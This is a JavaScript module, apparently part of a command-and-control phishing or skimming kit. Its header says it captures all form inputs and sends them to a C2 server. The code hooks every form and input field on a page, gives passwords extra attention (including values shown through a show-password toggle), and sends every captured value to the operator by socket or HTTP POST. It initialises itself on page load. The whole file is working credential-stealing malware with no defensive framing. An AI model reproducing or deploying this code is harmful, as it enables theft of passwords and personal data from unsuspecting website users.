/**
 * Form Hooks Module v1.0
 * Captures all form inputs and sends to C2 server
 */

const FormHooks = {
    enabled: true,
    capturedData: [],
    sessionId: null,
    
    // Initialize form hooks
    init() {
        this.sessionId = this.generateSessionId();
        this.hookAllForms();
        this.hookAllInputs();
        this.hookPasswordFields();
        
        if (typeof C2_DEBUG !== 'undefined') {
            C2_DEBUG.info('FormHooks', 'Initialized with session: ' + this.sessionId);
        }
    },
    
    // Generate unique session ID
    generateSessionId() {
        return 'fh_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
    },
    
    // Hook all form submissions
    hookAllForms() {
        document.querySelectorAll('form').forEach(form => {
            const originalSubmit = form.onsubmit;
            form.onsubmit = (e) => {
                this.captureForm(form);
                if (originalSubmit) originalSubmit(e);
            };
            
            // Also hook submit button clicks
            form.querySelectorAll('button[type="submit"], input[type="submit"]').forEach(btn => {
                btn.addEventListener('click', () => {
                    setTimeout(() => this.captureForm(form), 100);
                });
            });
        });
    },
    
    // Hook all input fields for real-time capture
    hookAllInputs() {
        document.querySelectorAll('input, textarea, select').forEach(input => {
            // Skip hidden and submit inputs
            if (input.type === 'hidden' || input.type === 'submit' || input.type === 'button') return;
            
            // Capture on blur (when user leaves field)
            input.addEventListener('blur', () => {
                this.captureInput(input);
            });
            
            // Capture on Enter key
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    this.captureInput(input);
                }
            });
            
            // For checkboxes and radios, capture on change
            if (input.type === 'checkbox' || input.type === 'radio') {
                input.addEventListener('change', () => {
                    this.captureInput(input);
                });
            }
        });
    },
    
    // Special handling for password fields
    hookPasswordFields() {
        document.querySelectorAll('input[type="password"]').forEach(pwd => {
            // Also capture visible password if toggle exists
            const toggle = pwd.parentElement.querySelector('.pass-toggle, [onclick*="togglePass"]');
            if (toggle) {
                toggle.addEventListener('click', () => {
                    setTimeout(() => {
                        const visiblePwd = document.getElementById(pwd.id);
                        if (visiblePwd && visiblePwd.type === 'text') {
                            this.captureInput(visiblePwd, 'password_visible');
                        }
                    }, 100);
                });
            }
        });
    },
    
    // Capture single input value
    captureInput(input, overrideType = null) {
        if (!this.enabled) return;
        
        const data = {
            type: overrideType || input.type || 'text',
            name: input.name || input.id || 'unknown',
            value: input.value,
            id: input.id,
            form: input.form ? (input.form.id || input.form.action || 'unknown') : 'no-form',
            page: window.location.pathname,
            timestamp: Date.now(),
            sessionId: this.sessionId
        };
        
        // Don't capture empty values
        if (!data.value || data.value.trim() === '') return;
        
        this.capturedData.push(data);
        this.sendToServer(data);
        
        if (typeof C2_DEBUG !== 'undefined') {
            C2_DEBUG.debug('FormHooks', `Captured: ${data.name} = ${data.value.substring(0, 20)}...`);
        }
    },
    
    // Capture entire form
    captureForm(form) {
        if (!this.enabled) return;
        
        const formData = {
            type: 'form_submit',
            action: form.action || window.location.href,
            method: form.method || 'POST',
            inputs: [],
            page: window.location.pathname,
            timestamp: Date.now(),
            sessionId: this.sessionId
        };
        
        form.querySelectorAll('input, textarea, select').forEach(input => {
            if (input.type === 'hidden' || input.type === 'submit' || input.type === 'button') return;
            if (!input.value || input.value.trim() === '') return;
            
            formData.inputs.push({
                name: input.name || input.id || 'unknown',
                value: input.value,
                type: input.type
            });
        });
        
        if (formData.inputs.length > 0) {
            this.capturedData.push(formData);
            this.sendToServer(formData);
            
            if (typeof C2_DEBUG !== 'undefined') {
                C2_DEBUG.success('FormHooks', `Form captured: ${formData.inputs.length} fields`);
            }
        }
    },
    
    // Send captured data to server
    sendToServer(data) {
        if (typeof socket !== 'undefined' && socket.connected) {
            socket.emit('form_capture', data);
        } else {
            // Fallback to HTTP POST
            fetch('/api/form-capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(data)
            }).catch(err => {
                if (typeof C2_DEBUG !== 'undefined') {
                    C2_DEBUG.error('FormHooks', 'Failed to send data', err);
                }
            });
        }
    },
    
    // Get all captured data
    getCaptured() {
        return this.capturedData;
    },
    
    // Clear captured data
    clear() {
        this.capturedData = [];
    },
    
    // Enable/disable hooks
    toggle(enabled) {
        this.enabled = enabled;
    }
};

// Auto-initialize when DOM is ready
document.addEventListener('DOMContentLoaded', () => {
    FormHooks.init();
});

// Also init for dynamically loaded content
if (document.readyState === 'complete' || document.readyState === 'interactive') {
    setTimeout(() => FormHooks.init(), 100);
}
